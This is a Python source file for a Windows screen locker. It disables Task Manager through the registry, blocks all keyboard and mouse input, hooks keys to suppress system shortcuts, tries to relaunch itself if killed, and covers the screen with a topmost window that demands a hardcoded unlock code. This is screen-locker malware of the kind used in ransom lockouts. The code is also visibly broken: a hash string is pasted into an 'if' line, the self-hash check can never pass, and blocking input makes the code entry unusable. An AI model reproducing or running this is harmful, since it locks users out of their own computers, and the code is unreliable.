import ctypes
import os
import sys
import tkinter as tk
from tkinter import messagebox
from ctypes import wintypes
from threading import Thread
import time
import hashlib

# Define constants
UNLOCK_CODE = "QWERTY"
BLOCK_INPUT = ctypes.windll.user32.BlockInput
USER32 = ctypes.windll.user32
KERNEL32 = ctypes.windll.kernel32

# Predefined hash for integrity check (calculated hash)
EXPECTED_HASH = "d17531976e6e1cd89e5c9bbf78e2c51894340437b712f33c59b1cbba51e13e6c"

# Function to block input
def block_input(enable=True):
    try:
        BLOCK_INPUT(bool(enable))
    except Exception as e:
        print(f"Error blocking input: {e}")

# Function to disable Task Manager
def disable_task_manager():
    try:
        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
    except Exception as e:
        print(f"Error disabling Task Manager: {e}")

# Function to enable Task Manager
def enable_task_manager():
    try:
        os.system('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f')
    except Exception as e:
        print(f"Error enabling Task Manager: {e}")

# Function to lock the workstation (preventing session switching)
def lock_workstation():
    try:
        USER32.LockWorkStation()
    except Exception as e:
        print(f"Error locking workstation: {e}")

# Function to create a low-level keyboard hook (disable common shortcuts)
def block_shortcuts():
    WH_KEYBOARD_LL = 13
    WM_KEYDOWN = 0x0100
    blocked_keys = {0x5B, 0x5C, 0x73, 0x09, 0x1B}  # Windows keys, F4, Alt+Tab, Esc

    def low_level_keyboard_proc(nCode, wParam, lParam):
        if nCode >= 0 and wParam == WM_KEYDOWN:
            vkCode = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_int)).contents.value
            if vkCode in blocked_keys:
                return 1  # Block the key
        return USER32.CallNextHookEx(None, nCode, wParam, lParam)

    HOOK_PROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
    hook = HOOK_PROC(low_level_keyboard_proc)
    hHook = USER32.SetWindowsHookExW(WH_KEYBOARD_LL, hook, KERNEL32.GetModuleHandleW(None), 0)

    if not hHook:
        print("Failed to install keyboard hook.")
        return

    try:
        while True:
            USER32.PeekMessageW(None, 0, 0, 0, 0)
    except Exception as e:
        print(f"Error in keyboard hook: {e}")
    finally:
        USER32.UnhookWindowsHookEx(hHook)

# Function to monitor the script process and restart if killed
def watchdog():
    while True:
        try:
            if os.getppid() == 1:  # Parent process is gone
                os.execv(sys.executable, ['python'] + sys.argv)
        except Exception as e:
            print(f"Watchdog error: {e}")
        time.sleep(1)

# Function to verify unlock code
def verify_code():
    if code_entry.get() == UNLOCK_CODE:
        cleanup()  # Cleanup on success
        root.destroy()  # Close the lock screen
        sys.exit(0)
    else:
        messagebox.showerror("Error", "Incorrect code! Please try again.")
        code_entry.delete(0, tk.END)  # Clear the entry field

# Integrity check function
def check_integrity():
    script_path = os.path.abspath(sys.argv[0])
    with open(script_path, 'rb') as f:
        content = f.read()
        current_hash = hashlib.sha256(content).hexdigest()
        if current_hash != EXPECTED_HASH:d17531976e6e1cd89e5c9bbf78e2c51894340437b712f33c59b1cbba51e13e6c
            messagebox.showerror("Error", "Script integrity check failed. Exiting.")
            sys.exit(1)

# Cleanup function to restore system state
def cleanup():
    enable_task_manager()
    block_input(False)

# Setup the lock screen
def setup_lock_screen():
    global root, code_entry
    root = tk.Tk()
    root.title("Lock Screen")
    root.attributes("-fullscreen", True)  # Fullscreen mode
    root.overrideredirect(1)  # Remove window decorations
    root.configure(bg="black")

    # Create a centered frame
    frame = tk.Frame(root, bg="black")
    frame.place(relx=0.5, rely=0.5, anchor="center")

    # Lock screen message
    tk.Label(
        frame,
        text="This device is locked. Please enter the unlock code:",
        fg="white",
        bg="black",
        font=("Arial", 18)
    ).pack(pady=10)

    # Code entry field
    code_entry = tk.Entry(frame, show="*", font=("Arial", 16), width=20)
    code_entry.pack(pady=10)

    # Unlock button
    tk.Button(
        frame,
        text="Unlock",
        command=verify_code,
        font=("Arial", 14),
        bg="gray",
        fg="white"
    ).pack(pady=10)

    # Focus on the code entry field
    code_entry.focus()

    # Keep the lock screen on top
    root.attributes("-topmost", True)
    root.mainloop()

# Main function
if __name__ == "__main__":
    try:
        # Run integrity check
        check_integrity()

        # Disable Task Manager
        disable_task_manager()

        # Block all input
        block_input(True)

        # Start the watchdog thread
        Thread(target=watchdog, daemon=True).start()

        # Start the keyboard hook thread
        Thread(target=block_shortcuts, daemon=True).start()

        # Launch the lock screen
        setup_lock_screen()

    finally:
        # Cleanup: re-enable Task Manager and unblock input
        cleanup()
